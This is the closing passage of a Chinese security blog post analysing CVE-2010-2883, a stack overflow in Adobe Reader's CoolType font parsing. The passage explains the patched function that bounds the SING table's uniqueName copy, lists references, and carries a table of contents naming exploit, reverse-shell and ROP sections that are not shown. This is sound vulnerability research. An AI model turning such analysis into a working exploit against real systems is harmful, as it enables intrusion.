<p>&emsp;&emsp;其中<code>strcat()</code>函数被<code>sub_813391E()</code>函数替换,我们进入sub_813391E()函数,看看是怎样验证<code>uniqueName字段</code>长度的：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">sub_813391E(&amp;uniqueName_buf, (<span class="keyword">char</span> *)(v22 + <span class="number">16</span>), <span class="number">260</span>);</span><br><span class="line">sub_8001243(&amp;uniqueName_buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *__<span class="function">cdecl <span class="title">sub_813391E</span><span class="params">(<span class="keyword">char</span> *uniqueName_buf, <span class="keyword">char</span> *uniqueName_str, <span class="keyword">int</span> max_length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> len; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax@2</span></span><br><span class="line"></span><br><span class="line">  len = <span class="built_in">strlen</span>(uniqueName_buf);                 <span class="comment">// 如果uniqueName_buf已经有了字符串,先计算其长度</span></span><br><span class="line">  <span class="keyword">if</span> ( max_length &gt; len )                       <span class="comment">// 判断字符串长度是否超过最大值,max_length=0x104=260</span></span><br><span class="line">    <span class="comment">// 将pdf中uniqueName字段的内容复制到缓冲区中已有的字符串之后,长度之和不能超过260字节</span></span><br><span class="line">    result = <span class="built_in">strncat</span>(&amp;uniqueName_buf[len], uniqueName_str, max_length - len - <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = uniqueName_buf;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//************************************************************************************************//</span></span><br><span class="line"><span class="comment">//函数原型：char *strncat(char *dest, const char *src, size_t n)                                   //</span></span><br><span class="line"><span class="comment">//函数功能：从*src复制n个字节到*dest                                                                //</span></span><br><span class="line"><span class="comment">//函数参数：dest -- 指向目标数组，该数组包含了一个 C 字符串，且足够容纳追加后的字符串，包括额外的空字符。 //</span></span><br><span class="line"><span class="comment">//         src -- 要追加的字符串。                                                                 //</span></span><br><span class="line"><span class="comment">//         n -- 要追加的最大字符数。                                                               //</span></span><br><span class="line"><span class="comment">//函数返回值：该函数返回一个指向最终的目标字符串 dest 的指针。                                        //</span></span><br><span class="line"><span class="comment">//************************************************************************************************//</span></span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;我们可以看到<code>sub_813391E()</code>函数首先查看<code>uniqueName在栈上的缓冲区</code>是否<code>已经有字符串存在</code>,并通过<code>strlen()</code>计算其长度。如果长度小于<code>260</code>,则通过<code>strncat()</code>函数将pdf中的字体数据中的SING表的<code>uniqueName字段</code>的内容复制到栈上缓冲区中<code>已经存在的字符串</code>后面,并且<code>复制长度</code>与缓冲区中<code>已经存在的字符串</code>的<code>长度之和</code>不能超过<code>260</code>字节。</p>
<p>&emsp;&emsp;到此为止，这个漏洞的分析暂告一段落，后面搞清楚了一些没搞清楚的细节，再来补充。</p>
<h2 id="0x60-Reference"><a href="#0x60-Reference" class="headerlink" title="0x60 Reference"></a>0x60 Reference</h2><blockquote>
<ul>
<li>1.<a href="http://ahageek.com/writer/migration/cve-2010-2883/" target="_blank" rel="noopener">Aha Geek:CVE-2010-2883 Analysis</a></li>
<li>2.<a href="https://bbs.pediy.com/thread-121986.htm" target="_blank" rel="noopener">看雪仙果:千年等一回-Adobe Reader CoolType库TTF字体解析栈溢出漏洞分析</a></li>
<li>3.<a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201009-077" target="_blank" rel="noopener">国家信息安全漏洞库:Adobe Reader和Acrobat CoolType.dll栈缓冲区溢出漏洞</a></li>
<li>4.<a href="https://zh.wikipedia.org/wiki/%E5%8F%AF%E7%A7%BB%E6%A4%8D%E6%96%87%E6%A1%A3%E6%A0%BC%E5%BC%8F" target="_blank" rel="noopener">维基百科:PDF</a></li>
<li>5.0day安全:软件漏洞分析技术 30.2 PDF文档格式简介</li>
<li>6.漏洞战争:软件漏洞分析精要 2.3 CVE-2010-2883 Adobe Reader TTF字体SING表栈溢出漏洞</li>
<li>7.C++反汇编与逆向分析技术揭秘 第9、10、11章</li>
<li>8.<a href="https://bbs.pediy.com/thread-257172.htm" target="_blank" rel="noopener">CVE-2010-2883漏洞分析 - 21Gun5</a></li>
<li>9.<a href="https://www.freebuf.com/articles/system/150474.html" target="_blank" rel="noopener">用TEB结构实现ShellCode的通用性</a></li>
<li>10.<a href="https://bbs.ichunqiu.com/thread-8849-1-1.html?from=ch" target="_blank" rel="noopener">CVE-2010-2883漏洞分析 - k0shl</a></li>
</ul>
</blockquote>

      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="/2018/06/01/CVE-2010-2883复现与分析/">CVE-2010-2883复现与分析</a></p>
        <p><span>文章作者:</span><a href="/" title="访问 Sp4n9x 的个人博客">Sp4n9x</a></p>
        <p><span>发布时间:</span>2018-06-01, 00:00</p>
        <p><span>最后更新:</span>2021-09-02, 16:21</p>
        
            <p>
                <span>更新历史:</span><i class="fa fa-github"></i>
                <a href="https://github.com/Sp4n9x/blog_backup/blob/master/_posts/2018-06-01.CVE-2010-2883复现与分析.md" title="顺序查看文章各部分修改记录" target = "_blank">Blame</a>,
                <a href="https://github.com/Sp4n9x/blog_backup/blob/master/_posts/2018-06-01.CVE-2010-2883复现与分析.md" title="查看文章有关更新记录" target = "_blank">History</a><span class="raw">文本模式:</span><i class="fa fa-file-text-o"></i>
                <a href="https://raw.githubusercontent.com/Sp4n9x/blog_backup/blob/master/_posts/2018-06-01.CVE-2010-2883复现与分析.md" title="查看 & 下载文章 Markdown 原始文本" target = "_blank"> .md Raw</a>
            </p>
        
        <p>
            <span>原始链接:</span><a class="post-url" href="/2018/06/01/CVE-2010-2883复现与分析/" title="CVE-2010-2883复现与分析">http://sp4n9x.github.io/2018/06/01/CVE-2010-2883复现与分析/</a>
            <span class="copy-path" data-clipboard-text="原文: http://sp4n9x.github.io/2018/06/01/CVE-2010-2883复现与分析/　　作者: Sp4n9x" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>

    
    <nav id="article-nav">
        
            <div id="article-nav-newer" class="article-nav-title">
                <a href="/2018/10/26/护网杯2018——WriteUp/">
                    护网杯2018——WriteUp
                </a>
            </div>
        
        
            <div id="article-nav-older" class="article-nav-title">
                <a href="/2018/05/27/redhat2018—writeup/">
                    redhat2018—writeup
                </a>
            </div>
        
    </nav>

  
</article>






    <div id="toc" class="toc-article">
        <strong class="toc-title">文章目录</strong>
        
            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-漏洞描述"><span class="toc-text">0x00 漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-分析环境"><span class="toc-text">0x10 分析环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x20-漏洞复现"><span class="toc-text">0x20 漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x21-生成exploit样本文件"><span class="toc-text">0x21 生成exploit样本文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x22-反弹shell"><span class="toc-text">0x22 反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x30-漏洞原理分析"><span class="toc-text">0x30 漏洞原理分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x31-PDF文件格式"><span class="toc-text">0x31 PDF文件格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x32-SING表结构"><span class="toc-text">0x32 SING表结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x33-漏洞触发"><span class="toc-text">0x33 漏洞触发</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、静态分析"><span class="toc-text">1、静态分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、动态调试"><span class="toc-text">2、动态调试</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-1、sub-8021B06-函数的作用"><span class="toc-text">2.1、sub_8021B06()函数的作用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-2、strcat-函数溢出分析"><span class="toc-text">2.2、strcat()函数溢出分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3、触发过程"><span class="toc-text">2.3、触发过程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-4、触发原因"><span class="toc-text">2.4、触发原因</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-5、样本中SING表数据“0x4A8A08C6”的作用"><span class="toc-text">2.5、样本中SING表数据“0x4A8A08C6”的作用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-6、样本中SING表数据“0x6C”的作用"><span class="toc-text">2.6、样本中SING表数据“0x6C”的作用</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x40-漏洞利用"><span class="toc-text">0x40 漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x41-ROP绕过DEP"><span class="toc-text">0x41 ROP绕过DEP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、阶段1：跳转到堆喷代码"><span class="toc-text">1、阶段1：跳转到堆喷代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、阶段2：将真正的shellcode复制到可读可写可执行内存段"><span class="toc-text">2、阶段2：将真正的shellcode复制到可读可写可执行内存段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、阶段3：执行shellcode"><span class="toc-text">3、阶段3：执行shellcode</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x42-Heap-Spray"><span class="toc-text">0x42 Heap Spray</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x43-Exploit脚本分析"><span class="toc-text">0x43 Exploit脚本分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、exploit"><span class="toc-text">1、exploit()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、make-ttf"><span class="toc-text">2、make_ttf()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、make-js"><span class="toc-text">3、make_js()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4、make-pdf"><span class="toc-text">4、make_pdf()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x50-漏洞修复"><span class="toc-text">0x50 漏洞修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x60-Reference"><span class="toc-text">0x60 Reference</span></a></li></ol>
        
    </div>
    <style>
        .left-col .switch-btn,
        .left-col .switch-area {
            display: none;
        }
        .toc-level-6 i,
        .toc-level-6 ol {
            display: none !important;
        }
    </style>

    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">

    <script>
        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"true"];
    </script>



    
    <div class="share">
        <div class="bdsharebuttonbox">
            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
        </div>
        <script>
            window._bd_share_config={
                "common":{"bdSnsKey":{},"bdText":"CVE-2010-2883复现与分析　| Sp4n9x's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
        </script>
    </div>




    
        <section id="comments">
    <style> aside.comment-bar { margin: auto 30px; }</style>
    <div id="disqus_thread"></div>
    <script>
        var disqus_config = function () {
            this.page.url = 'http://sp4n9x.github.io/2018/06/01/CVE-2010-2883复现与分析/';
            this.page.identifier = '2018/06/01/CVE-2010-2883复现与分析/';
        };
        var loadComment = function() {
            var d = document, s = d.createElement('script');
            s.src = '//Sp4n9x.disqus.com/embed.js';
            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        }
    </script>
    
    <aside class="comment-bar">
        <a href="javascript:void(0);">
            <i class="fa fa-commenting-o animated infinite pulse"></i>
            <i class="fa fa-spinner fa-pulse"></i>
            <span class="count-comment"></span>
        </a>
    </aside>

    <script>
        var $commentBar = $("#comments aside.comment-bar");
        var load$hide = function(){
            $commentBar.find("a > i").toggle();
            loadComment();
            $commentBar.fadeOut(800);
        }
        $commentBar.click(function(){
            load$hide();
        })
        $commentBar.children("a").hover(function(){
            load$hide();
        })
        if (window.location.hash === "#comments") {
            load$hide();
        }
    </script>

</section>


<script id="dsq-count-scr" src="//Sp4n9x.disqus.com/count.js" async></script>
<span class="disqus-comment-count" data-disqus-identifier="2018/06/01/CVE-2010-2883复现与分析/"></span>
<span class="disqus-comment-count" data-disqus-url="http://sp4n9x.github.io/2018/06/01/CVE-2010-2883复现与分析/"></span>
<script>
    $(".disqus-comment-count").hide();
    var $disqusCount = $(".disqus-comment-count");
    $disqusCount.bind("DOMNodeInserted", function(e) {
        $(".count-comment").text(
            $(this).text().replace(/[^0-9]/ig,"")
        )
        DISQUSWIDGETS.getCount({reset: true});
    })
</script>

    




    <div class="scroll" id="post-nav-button">
        
            <a href="/2018/10/26/护网杯2018——WriteUp/" title="上一篇: 护网杯2018——WriteUp">
                <i class="fa fa-angle-left"></i>
            </a>
        

        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>

        
            <a href="/2018/05/27/redhat2018—writeup/" title="下一篇: redhat2018—writeup">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>

    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/05/27/ELF_FileFormat_Analysis/">ELF文件格式分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/14/TEB_and_PEB/">TEB和PEB</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/22/BlackHat USA 2010 - Understanding the Low Fragmentation Heap/">翻译 - BlackHat USA 2010 - Understanding the Low Fragmentation Heap</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/16/CVE-2012-1876复现与分析/">CVE-2012-1876复现与分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/10/CVE-2010-2553复现与分析/">CVE-2010-2553复现与分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/30/AVI文件格式分析/">AVI文件格式分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/20/CVE-2010-3333复现与分析/">CVE-2010-3333复现与分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/15/ret2_dl_runtime_resolve详解/">ret2_dl_runtime_resolve详解</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/19/RCTF2015——WriteUp(Pwn)/">RCTF2015——WriteUp(Pwn)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/05/ZCTF2016——WriteUp(Pwn)/">ZCTF2016——WriteUp(Pwn)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/08/ZIP文件格式分析/">ZIP文件格式分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/10/RAR文件格式分析/">RAR文件格式分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/11/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/">OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/26/护网杯2018——WriteUp/">护网杯2018——WriteUp</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/01/CVE-2010-2883复现与分析/">CVE-2010-2883复现与分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/27/redhat2018—writeup/">redhat2018—writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/11/一步一步学ROP之Linux_x64篇-蒸米/">一步一步学ROP之Linux_x64篇-蒸米</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/10/一步一步学ROP之Linux_x86篇-蒸米/">一步一步学ROP之Linux_x86篇-蒸米</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/08/Kali2018-搜狗输入法安装/">Kali2018-搜狗输入法安装</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/05/Pwn环境搭建-Ubuntu16.04/">Pwn环境搭建——Ubuntu16.04</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/23/pwnable.kr/">pwnable.kr</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/27/MySQL宽字节注入/">MySQL宽字节注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/15/实验吧Wirteup合集/">实验吧WriteUp合集</a></li></ul>




    <script>
        
    </script>
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                <i class="fa fa-copyright"></i> 
                2018-2021 Sp4n9x
            </div>
            <div class="footer-right">
                <span> Sp4n9x's Blog <i class="fa fa-heart animated infinite pulse"></i>
            </div>
        </div>
        
    </div>
</footer>
    </div>
    
    <script src="/js/GithubRepoWidget.js"></script>

<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>

    <script>
        $(document).ready(function() {
            var iPad = window.navigator.userAgent.indexOf('iPad');
            if (iPad > -1 || $(".left-col").css("display") === "none") {
                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
            }
            else {
                var backgroundnum = 10;
                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
            }
        })
    </script>





    <script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>

<div class="scroll" id="scroll">
    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    // Open in New Window
    
        var oOpenInNew = {
             github: ".github-widget a", 
            
             post: ".article-entry a[href]", 
             tags: ".article-tag a", 
             categories: ".article-category a, a.tag-list-link", 
            
             archives: ".archive-article-title", 
             miniArchives: "a.post-list-link", 
            
             friends: "#js-friends a", 
             socail: ".social a" 
        }
        for (var x in oOpenInNew) {
            $(oOpenInNew[x]).attr("target", "_blank");
        }
    
</script>
<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
    <!-- 点击爱心效果 -->
    <script src="/js/love.js"></script>
  </div>
</body>
</html>